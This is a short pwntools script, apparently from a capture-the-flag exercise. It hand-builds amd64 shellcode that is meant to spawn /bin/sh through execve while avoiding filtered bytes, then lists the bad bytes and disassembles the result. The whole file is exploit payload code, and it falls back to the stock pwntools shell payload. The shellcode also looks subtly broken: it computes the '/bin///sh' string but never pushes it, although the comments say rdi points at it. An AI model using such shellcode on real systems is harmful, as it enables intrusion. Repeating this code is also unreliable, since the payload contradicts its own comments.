from pwn import *

context.arch='amd64'
context.os='linux'

shell = asm("""

    and r10, 0x0
    and rdx, 0x0
    sub rax, rax
    sub rdi, rdi
    sub rsi, rsi
    sub rdx, rdx
    sub rcx, rcx
    sub r8, r8
    sub r9, r9
    sub r10, r10
    sub r11, r11
    sub r12, r12
    sub r13, r13
    sub r14, r14
    sub r15, r15

    /* push 0x68 */
    push 0x68
    push rdx
    push r10

    /* 0x732f2f2f6e69622f */
    mov r15,(0x732f2f2f6e69622f-0x03060306)
    add r15, (0x03060306)/2
    add r15, (0x03060306)/2

    /* rdi = rsp */
    xchg r9, rsp
    xchg r9, rdi

    /* rsi = 0x0 */
    sub r13, r13
    xchg r13, rsi

    /* rdx = 0x0 */
    sub r13, r13
    xchg r13, rdx

    /* rax = 0x3b */
    mov r9b, 0x3b
    xchg r9, rax

    /* execve(rdi="/bin/sh",rsi=0x0,rdx=0x0) */
    syscall
""")

if args.BAD:
  shell = asm(shellcraft.sh())

log.info(b"----------------------------")
log.info(b"Finding Bad Bytes in Shellcode:")

even_bytes = 0
for b in shell:
    r = (0x123412340000 + b) & 2
    if r == 0:
       log.warn("\tBad Byte: %s" %hex(b))
       even_bytes+=1

log.info(b"----------------------------")
log.info(b"Total Violations: %i" %even_bytes)
log.info(b"----------------------------")
log.info(disasm(shell))
log.info(b"Testing Shellcode Execution")
log.info(b"----------------------------")
log.info(b'Shellcode Bytes: %s' %shell)
#p = run_shellcode(shell)
#p.interactive()

